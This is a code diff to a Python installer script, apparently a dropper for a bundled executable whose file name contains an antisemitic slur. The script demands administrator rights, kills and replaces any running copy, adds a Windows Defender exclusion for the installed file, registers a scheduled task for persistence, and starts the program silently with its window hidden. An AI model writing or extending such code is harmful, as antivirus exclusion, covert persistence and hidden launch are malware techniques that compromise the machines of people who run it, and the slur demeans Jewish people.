@@ -4,6 +4,8 @@ import sys
 import subprocess
 import PyElevate
 
+# Sadly you cannot run this as a .py and must compile it first to test
+
 # compile command 
 #   pyinstaller --onefile --add-binary="builds/JewFuss-XT.exe;." --distpath=builds --workpath=data installer.py
 
@@ -50,7 +52,6 @@ def create_scheduled_task(task_name, file_path):
     except subprocess.CalledProcessError as e:
         print(f"Error creating scheduled task: {e}")
 
-# Ensure the script is run with admin privileges
 if not PyElevate.elevated():
     input("Please run this installer as an administrator.")
     exit(0)
@@ -69,13 +70,28 @@ else:
 extracted_app_path = os.path.join(temp_dir, app_name)
 final_app_path = os.path.join(target_dir, app_name)
 
-# Move the extracted file to the persistent folder (ensuring it's never deleted)
+print(f"Installing to: {final_app_path}")
+
 try:
-    if not os.path.exists(final_app_path):
+    if os.path.exists(final_app_path):
+        print(f"Found existing file")
+        try:
+            print("Terminating existing process...")
+            os.system(f'taskkill /im "{app_name}" /f ')
+            os.remove(final_app_path)
+            print(f"Deleted existing file: {app_name}")
+        except Exception as e:
+            print(f"Error deleting existing file: {e}")
+            input("Press Enter to exit.")
+            sys.exit(1)
+    try:
         shutil.copy(extracted_app_path, final_app_path)
-        print(f"Copied {app_name} to {final_app_path}")
-    else:
-        print(f"File already exists at {final_app_path}, skipping copy.")
+        print(f"Copied {app_name} to {target_dir}")
+    except Exception as e:
+        print(f"Fatal Error: Error moving file: {e}")
+        input("Press Enter to exit.")
+        sys.exit(1)
+
 except Exception as e:
     input(f"Fatal Error: Error moving file: {e}")
     sys.exit(1)
@@ -83,7 +99,6 @@ except Exception as e:
 add_defender_exclusion(final_app_path)
 create_scheduled_task(task_name, final_app_path)
 
-# Run the copied file silently (no console window)
 try:
     startupinfo = subprocess.STARTUPINFO()
     startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
